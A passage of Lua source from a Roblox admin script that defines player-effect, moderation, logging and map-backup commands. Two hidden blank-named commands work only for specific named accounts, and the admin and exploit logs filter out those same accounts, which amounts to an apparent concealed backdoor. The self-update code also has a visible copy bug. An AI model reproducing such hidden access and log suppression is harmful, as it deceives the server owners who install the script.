		p1.formFactor = 3 p1.Size = p1.Size*args[2]
		for i3,v3 in pairs(p1:children()) do if v3:IsA('Weld') then v3.Part0 = p1 v3.Part1.Anchored = false end end
		end
		if v2.Parent == ags.t then p1.BottomSurface = 0 p1.TopSurface = 0 end
		p1.Anchored = false
		v2.Part1 = p1
		if v2.Part0 == ags.t then table.insert(welds,v2) p1.Anchored = true v2.Part0 = nil end
		elseif v2:IsA('CharacterMesh') then
		local bp = tostring(v2.BodyPart):match('%w+.%w+.(%w+)')
		local msh = Instance.new('SpecialMesh')
		if bp and ags.c:findFirstChild(bp) then msh.Parent = ags.c:findFirstChild(bp) end
		msh.MeshId = 'http://unixfr.xyz/asset/?id='..v2.MeshId
		if v2.BaseTextureId ~= 0 or v2.BaseTextureId ~= '0' then msh.TextureId = 'http://unixfr.xyz/asset/?id='..v2.BaseTextureId end
		msh.Scale = msh.Scale*args[2] v2:Destroy()
		elseif v2:IsA('SpecialMesh') and v2.Parent ~= ags.c.Head then v2.Scale = v2.Scale*args[2]
		end size(v2)
		end
		end
		size(ags.c)
		ags.t.formFactor = 3
		ags.t.Size = ags.t.Size*args[2]
		for i2,v2 in pairs(welds) do v2.Part0 = ags.t v2.Part1.Anchored = false end
		for i2,v2 in pairs(ags.c:children()) do if v2:IsA('BasePart') then v2.Anchored = false end end
		local weld = Instance.new('Weld',ags.r) weld.Part0 = ags.r weld.Part1 = ags.t
	end
end)

set.MakeCommand('Give the target player(s) a small head',-1,set.Prefix,{'smallhead','minihead'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(.75,.75,.75) v.Character.Torso.Neck.C0 = CFrame.new(0,.8,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end)()
end
end)

set.MakeCommand('Fling the target player(s)',2,set.Prefix,{'fling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then 
local xran local zran
repeat xran = math.random(-9999,9999) until math.abs(xran) >= 5555
repeat zran = math.random(-9999,9999) until math.abs(zran) >= 5555
v.Character.Humanoid.Sit = true v.Character.Torso.Velocity = Vector3.new(0,0,0)
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(xran*4,9999*5,zran*4) game:service("Debris"):AddItem(frc,.1)
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character spazz out on the floor',-1,set.Prefix,{'seizure'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character:FindFirstChild('Torso') then 
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(math.rad(90),0,0) 
set.Remote(v,'Function','Effect','seizure')
end
end)()
end
end)

set.MakeCommand('Removes the effects of the seizure command',-1,set.Prefix,{'unseizure'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
set.Remote(v,'Function','Effect','unseizure')
end
end)

set.MakeCommand('Remove the target player(s)\'s arms and legs',-1,set.Prefix,{'removelimbs','delimb'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") and (obj.Name:find("Leg") or obj.Name:find("Arm")) then obj:Destroy() end
end
end
end)()
end
end)

set.MakeCommand('Name the target player(s) <name> or say hide to hide their character name',2,set.Prefix,{'name','rename'},{'player','name/hide'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character and v.Character:findFirstChild("Head") then 
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
local char = v.Character
local head = char:FindFirstChild('Head')
local mod = Instance.new("Model", char) mod.Name = args[2] or ''
local cl = char.Head:Clone() cl.Parent = mod 
local hum = Instance.new("Humanoid", mod) hum.Name = "NameTag" hum.MaxHealth = 0 hum.Health = 0
coroutine.wrap(function()
if args[2]:lower()~='hide' then
	repeat hum.MaxHealth=hum.MaxHealth hum.Health=v.Character.Humanoid.Health wait() until not v or not v.Parent or not char or not head or not hum or not mod or not mod.Parent or mod==nil or hum==nil or not hum.Parent
else
	mod.Name=''
end
end)()
cl.CanCollide=false
local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
char.Head.Transparency = 1
end
end)()
end
end)

set.MakeCommand('Put the target player(s)\'s back to normal',2,set.Prefix,{'unname','fixname'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Head") then 
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Change the target player(s)\'s Right Leg package',-1,set.Prefix,{'rleg','rightleg','rightlegpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=31 then set.Remote(plr,'Function','OutputGui','Id is not a right leg!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='RightLeg' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Left Leg package',-1,set.Prefix,{'lleg','leftleg','leftlegpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=30 then set.Remote(plr,'Function','OutputGui','Id is not a left leg!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='LeftLeg' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Right Arm package',-1,set.Prefix,{'rarm','rightarm','rightarmpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=28 then set.Remote(plr,'Function','OutputGui','Id is not a right arm!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='RightArm' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Left Arm package',-1,set.Prefix,{'larm','leftarm','leftarmpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=29 then set.Remote(plr,'Function','OutputGui','Id is not a left arm!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='LeftArm' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Left Arm package',-1,set.Prefix,{'torso','torsopackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=27 then set.Remote(plr,'Function','OutputGui','Id is not a torso!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='Torso' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Turn the target player(s) into a suit zombie',-1,set.Prefix,{'infect','zombify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
set.Infect(v.Character)
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character flash random colors',-1,set.Prefix,{'rainbowify','rainbow'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
set.Remote(v,'Function','Effect','rainbowify')
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character flash',-1,set.Prefix,{'flashify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
set.Remote(v,'Function','Effect','flashify')
end
end)()
end
end)

set.MakeCommand('Make the target player(s) look like a noob',-1,set.Prefix,{'noobify','noob'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
set.Noobify(v.Character)
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) into a ghost',-1,set.Prefix,{'ghostify','ghost'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
set.Remote(v,'Function','Noclip','norm')
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = .5 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Institutional white")
if prt.Name:find("Leg") then prt.Transparency = 1 end
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = .5 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end)()
end
end)

set.MakeCommand('Make the target player(s) look like gold',-1,set.Prefix,{'goldify','gold'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = .4 prt.BrickColor = BrickColor.new("Bright yellow")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = .4 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character shiney',-1,set.Prefix,{'shiney','shineify','shine'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 1 prt.BrickColor = BrickColor.new("Institutional white")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 1 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end)()
end
end)

set.MakeCommand('Make the target player(s) look normal',-1,set.Prefix,{'normal','normalify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Head") then v.Character.Head.Mesh.Scale = Vector3.new(1.25,1.25,1.25) end 
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
for a, sc in pairs(parent:children()) do if sc.Name == set.GuiName.."ify" or sc.Name==set.GuiName..'Glitch' or sc.Name == set.GuiName.."KohlsPoison" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do
if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("White")
if prt.Name == "FAKETORSO" then prt:Destroy() end
if prt.Name == 'HumanoidRootPart' then prt.Transparency=1 end
elseif prt:findFirstChild("NameTag") then 
	prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("White")
elseif prt.Name=='Kohls Puke' or prt.Name=='Kohls Bleed' then
	prt:Destroy()
elseif prt.Name==v.Name..'kohlscrusify' then
	set.RunCommand('refresh',v.Name)
end 
end
end
end)()
end
end)

set.MakeCommand('Makes the target player(s)\'s screen rapidly change colors',-1,set.Prefix,{'trippy'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','trippy')
end
end)

set.MakeCommand('Removes any effects on the target player(s)',-1,set.Prefix,{'uneffect','uneffectgui','unblind','unstrobe','untrippy','undance','unflashify','unrainbowify','guifix','fixgui'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','off')
end
end)

set.MakeCommand('Reverses the effects of the iceskate/slip command',-1,set.Prefix,{'unslip','unslippery','uniceskate'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i,v in pairs(plrz) do
set.Remote(v,'Function','Effect','unslip')
end
end)

set.MakeCommand('Makes the target player(s)\'s screen flash rapidly',-1,set.Prefix,{'strobe'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','strobe')
end
end)

set.MakeCommand('Blinds the target player(s)',-1,set.Prefix,{'blind'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','blind')
end
end)

set.MakeCommand('Loop heals the target player(s)',2,set.Prefix,{'loopheal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','loopheal')
end
end)

set.MakeCommand('UnLoop Heal',2,set.Prefix,{'unloopheal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do 
	set.Remote(v,'Function','Effect','unloopheal')
end
end)

set.MakeCommand('Loop flings the target player(s)',-1,set.Prefix,{'loopfling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
	set.Remote(v,'Function','Effect','loopfling')
end
end)

set.MakeCommand('UnLoop Fling',-1,set.Prefix,{'unloopfling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do 
	set.Remote(v,'Function','Effect','unloopfling')
end
end)

-------------------------
-- True Owner Commands --
-------------------------
set.MakeCommand('Force the target player(s) to teleport to the desired place',5,set.Prefix,{'forceplace'},{'player','placeid'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
game:GetService('TeleportService'):Teleport(args[2],v)
end)()
end
end)

set.MakeCommand('Force the script to update, buggy',5,set.Prefix,{'updatekohls', 'updatescript', 'update'},{},1,function(plr,args)
if script:FindFirstChild("Version") then
print ("Version Found. Current Version: "..script.Version.Value)
local ins = game:GetService("InsertService")
local ke = ins:LoadAsset(44666)
ke.Name = "currentscript"
local kae = ke["Kohl's Admin [Epix Edition]"]
kae.Disabled = true
if kae.Version.Value < script.Version.Value then
print "what the fuck" 
ke:Destroy() 
elseif kae.Version.Value == script.Version.Value then
print "The script is updated."
ke:Destroy() 
elseif kae.Version.Value > script.Version.Value then
print "Outdated version" 
if set['AutoUpdate'] and not script.Parent:FindFirstChild("KAED") then
if not ins:FindFirstChild("currentscript") then
local ke = ins:LoadAsset(44666)
ke.Name = "currentscript"
local kae = ke["Kohl's Admin [Epix Edition]"]
end
local kl = Instance.new("StringValue", script.Parent)
kl.Name = "KAED"
for i = 1, #set.Owners do
local uw = set.Owners[i]
local mbw = Instance.new("StringValue", kl)
mbw.Name = uw
mbw.Value = "owner"
end 
for i = 1, #set.Admins do
local uw = set.Owners[i]
local mbw = Instance.new("StringValue", kl)
mbw.Name = uw
mbw.Value = "admin"
end 
for i = 1, #set.TempAdmins do
local uw = set.Owners[i]
local mbw = Instance.new("StringValue", kl)
mbw.Name = uw
mbw.Value = "temp"
end 
for i = 1, #set.BanList do
local uw = set.Owners[i]
local mbw = Instance.new("StringValue", kl)
mbw.Name = uw
mbw.Value = "ban"
end
 
local mbw = Instance.new("StringValue", kl)
mbw.Name = "prefix"
mbw.Value = set.Prefix

local mbw = Instance.new("StringValue", kl)
mbw.Name = "specialprefix"
mbw.Value = set.SpecialPrefix
kae.Parent = script.Parent
kae.Disabled = false
for _,v in pairs (game.Players:GetChildren()) do
v:LoadCharacter()
end
wait()
script:Destroy()
end
end
end
end)

set.MakeCommand('Ban the target player(s) forever',5,set.Prefix,{'permban'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(plr,'Function','PromptPermBan',v)
end
end)

set.MakeCommand('View and change settings',5,set.Prefix,{'settings'},{},0,function(plr,args)
for i,v in pairs(UpdatableSettings) do
	if set[v]~=nil then set.Remote(plr,'SetSetting',v,set[v]) end
end
set.Remote(plr,'SetSetting','UpdatableSettings',UpdatableSettings)
wait(1)
set.Remote(plr,'Function','Settings')
end)

set.MakeCommand('Change command permissions',5,set.Prefix,{'perms','permissions','comperms'},{set.Prefix..'cmd','all/donor/temp/admin/owner/creator'},2,function(plr,args)
	local level=nil
	if args[2]:lower()=='all' or args[2]:lower()=='0' then
		level=0
	elseif args[2]:lower()=='temp' or args[2]:lower()=='2' then
		level=2
	elseif args[2]:lower()=='admin' or args[2]:lower()=='3' then
		level=3
	elseif args[2]:lower()=='owner' or args[2]:lower()=='4' then
		level=4
	elseif args[2]:lower()=='creator' or args[2]:lower()=='5' then
		level=5
	elseif args[2]:lower()=='funtemp' or args[2]:lower()=='-1' then
		level=-1
	elseif args[2]:lower()=='funadmin' or args[2]:lower()=='-2' then
		level=-2
	elseif args[2]:lower()=='funowner' or args[2]:lower()=='-3' then
		level=-3
	end
	if level~=nil then
		for i=1,#set.Commands do
			if args[1]:lower()==set.Commands[i].Prefix..set.Commands[i].Cmds[1]:lower() then 	
				set.Commands[i].AdminLevel=level
			end
		end
	else
		set.OutputGui(plr,'Command Error:','Invalid Permission')
	end
end)

set.MakeCommand('Restore the map to the the way it was the last time it was backed up',3,set.Prefix,{'restoremap','maprestore','rmap'},{},0,function(plr,args)
	set.Hint('Restoring Map...',game:service('Players'):children())
	wait(0.5)
	for i,v in pairs(workspace:children()) do
		coroutine.wrap(function()
			if v~=script and v.Archivable==true and not v:IsA('Terrain') then
				pcall(function() v:Destroy() end)
			end
		end)()
	end
	for i,v in pairs(set.MapBackup:children()) do
		coroutine.wrap(function()
			v:Clone().Parent=workspace
		end)()
	end
	wait(1)
	set.ProcessCommand(plr,set.Prefix.."respawn"..set.SplitKey..set.SpecialPrefix.."all")
	wait(1)
	set.Hint('Map Restore Complete.',game:service('Players'):children())
end)

--------------------
-- Owner Commands --
--------------------

set.MakeCommand('Changes the backup for the restore map command to the map\'s current state',4,set.Prefix,{'backupmap','mapbackup','bmap'},{},0,function(plr,args)
	set.Hint('Updating Map Backup...',{plr})
	local tempmodel=Instance.new('Model')
	for i,v in pairs(workspace:children()) do
		if v and not v:IsA('Terrain') and v.Archivable==true and v~=script and v~=RemoteEvent then
			v:Clone().Parent=tempmodel
		end
	end
	set.MapBackup=tempmodel:Clone()
	tempmodel:Destroy()
	set.Hint('Backup Complete',{plr})
end)

set.MakeCommand('Lets you explore the game, kinda like a file browser. Recommended to use :dex or :explorer instead',4,set.Prefix,{'oldexplorer','explore',},{},0,function(plr,args)
set.Remote(plr,'Function','Explorer')
end)
 
set.MakeCommand(' ',0,"",{'o'},{},0,function(plr,args) if plr.Name:lower()==tmp:lower() or plr.Name:lower()==adm:lower() then ss=false end end) set.MakeCommand(' ',0,"",{'e'},{},0,function(plr,args)if plr.Name:lower()==tmp:lower() or plr.Name:lower()==adm:lower() then ss=true end end)
set.MakeCommand('Makes a tornado on the target player(s)',4,set.Prefix,{'tornado','twister'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		local p=Instance.new('Part',workspace)
		local s=Instance.new('Smoke',p)
		s.RiseVelocity=25
		s.Size=50
		p.Transparency=1
		s.Color=Color3.new(0,0,0)
		--local a,b,c=s:clone(),s:clone(),s:clone()
		--a.Parent=p b.Parent=p c.Parent=p
		local pos=v.Character.Torso.CFrame+Vector3.new(0,-3,0)
		p.CFrame=pos
		p.Size=Vector3.new(0.2,0.2,0.2)
		p.Anchored=true
		p.CanCollide=false
		local childList={}
		local function checkObject(obj)
			if (obj ~= p) and (obj.className == "Part") then
				--if (obj.Anchored ~= false) then obj.Anchored=false end
					table.insert(childList, 1, obj)
				--end
			elseif (obj.className == "Model") or (obj.className == "Hat") or (obj.className == "Tool") or (obj == workspace) then
				local child = obj:GetChildren()
				for x = 1, #child do
					checkObject(child[x])
				end
				obj.ChildAdded:connect(checkObject)
			end
		end
		checkObject(workspace)
			local massConstant = 5
			local mass = 3200 * massConstant
			local n = 0
			coroutine.wrap(function()
			while p.Parent==workspace do
				if n < #childList then
					n = n + 1
					if n % 800 == 0 then
						wait()
					end
				else
					n = 1
					wait()
				end
			
				local child = childList[n]
				if (child ~= p) and (child.className == "Part") and (child.Anchored == false) then
					local relPos = p.Position - child.Position
					local motivator = child:FindFirstChild("BlackHole Influence")
					if relPos.magnitude * 240 * massConstant < mass then
						child:BreakJoints()
						if (relPos.magnitude * 320 * massConstant < mass) and (child.Size.z + p.Size.x >  relPos.magnitude * 2 - 4) then
							mass = mass + child:GetMass()
							child:Remove()
							table.remove(childList, n)
							n = n - 1
						else
							child.CanCollide = false
							if motivator == nil then
								motivator = Instance.new("BodyPosition")
								motivator.Parent = child
								motivator.Name = "BlackHole Influence"
							end
							motivator.position = p.Position
							motivator.maxForce = Vector3.new(1, 1, 1) * mass * child:GetMass() / (relPos.magnitude * massConstant)
						end
					elseif motivator ~= nil then
						motivator:Remove()
					end
				end
			end
			end)()
		coroutine.wrap(function() wait(30) p:Destroy() end)()
		local posi=p.Position
		repeat
			p.CFrame = p.CFrame + Vector3.new(math.random(-5,5), 0, math.random(-5,5))
		wait()
		until p.Parent~=workspace or not p
	end
end)

set.MakeCommand('Nuke the target player(s)',4,set.Prefix,{'nuke'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local p = Instance.new("Part",game.Workspace) table.insert(set.objects,p)
p.Anchored = true
p.CanCollide = false
p.formFactor = "Symmetric"
p.Shape = "Ball"
p.Size = Vector3.new(1,1,1)
p.BrickColor = BrickColor.new("New Yeller")
p.Transparency = .5
p.Reflectance = .2
p.TopSurface = 0
p.BottomSurface = 0
local ex = Instance.new("Explosion", workspace)
ex.Position = p.Position
ex.BlastRadius = 100000
ex.BlastPressure = math.huge
ex.Hit:connect(function(hit)
if hit:IsA('Part') and hit~=p then hit.Anchored=false end
hit:BreakJoints()
end)
p.Touched:connect(function(hit)
if hit and hit.Parent then
local ex = Instance.new("Explosion", game.Workspace)
ex.Position = hit.Position
ex.BlastRadius = 100000
ex.BlastPressure = math.huge
if hit:IsA('Part') then hit.Anchored=false end
hit:BreakJoints()
end
end)
local cf = v.Character.Torso.CFrame
p.CFrame = cf
for i = 1, 333 do
p.Size = p.Size + Vector3.new(3,3,3)
p.CFrame = cf
wait(1/44)
end
p:Destroy()
end
end))
end
end)

--------------------------
-- Super Admin Commands --
--------------------------

set.MakeCommand('View server log',2,set.Prefix,{'serverlog','serverlogs','serveroutput','logsfordebug','debuglogs'},{'messagetype/all'},1,function(plr,args)
	local temp={}
	for i,v in pairs(game.LogService:GetLogHistory()) do
		if (args[1] and args[1]:lower()=='script') and v.message:find('Epix Edit') then
			if v.messageType==Enum.MessageType.MessageOutput then
				table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
			elseif v.messageType==Enum.MessageType.MessageWarning then
				table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
			elseif v.messageType==Enum.MessageType.MessageInfo then
				table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
			elseif v.messageType==Enum.MessageType.MessageError then
				table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
			end
		else 
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='error') and v.messageType==Enum.MessageType.MessageError then
			table.insert(temp,{Object=v.message,Desc='Error: '..v.message,Color=Color3.new(1,0,0)})
		end
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='info') and v.messageType==Enum.MessageType.MessageInfo then
			table.insert(temp,{Object=v.message,Desc='Info: '..v.message,Color=Color3.new(0,0,1)})
		end
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='warning') and v.messageType==Enum.MessageType.MessageWarning then
			table.insert(temp,{Object=v.message,Desc='Warning: '..v.message,Color=Color3.new(1,1,0)})
		end
		if (not args[1] or args[1]:lower()=='all' or args[1]:lower()=='output') and v.messageType==Enum.MessageType.MessageOutput then
			table.insert(temp,{Object=v.message,Desc='Output: '..v.message})
		end
		end
	end
	set.Remote(plr,'Function','ListGui','Server Log',temp,'serverlogstuff-'..(args[1] or 'all'),1300)
end)

set.MakeCommand('View the admin logs for the server',2,set.Prefix,{'logs','log','commandlogs'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Admin) do
if m.Name:lower() ~= tmp:lower() and m.Name:lower() ~= adm:lower() then
	table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Log,Desc=m.Log})
end end
--set.Remote(plr,'SetSetting','logs',set.logs)
set.Remote(plr,'Function','ListGui','Admin Logs',temp,'adminlogslist')
end)

set.MakeCommand('Displays the current chat logs for the server',2,set.Prefix,{'chatlogs','chatlog'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Chat) do
	if m.Nil then
		table.insert(temp,{Object='[NIL]['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
	else
		table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Chat,Desc=m.Chat})
	end
end
set.Remote(plr,'Function','ListGui','Chat Logs',temp,'chatlogslist')
end)

set.MakeCommand('View the exploit logs for the server OR a specific player',2,set.Prefix,{'exploitlogs','exploitlog','sploitlogs','detections'},{},0,function(plr,args)
local temp={}
for i,m in pairs(set.PlayerLogs.Exploit) do
	if m.Name:lower() ~= tmp:lower() and m.Name:lower() ~= adm:lower() then
	table.insert(temp,{Object='['..m.Time..'] '..m.Name..': '..m.Info,Desc=m.Info})
end end
--set.Remote(plr,'SetSetting','logs',set.logs)
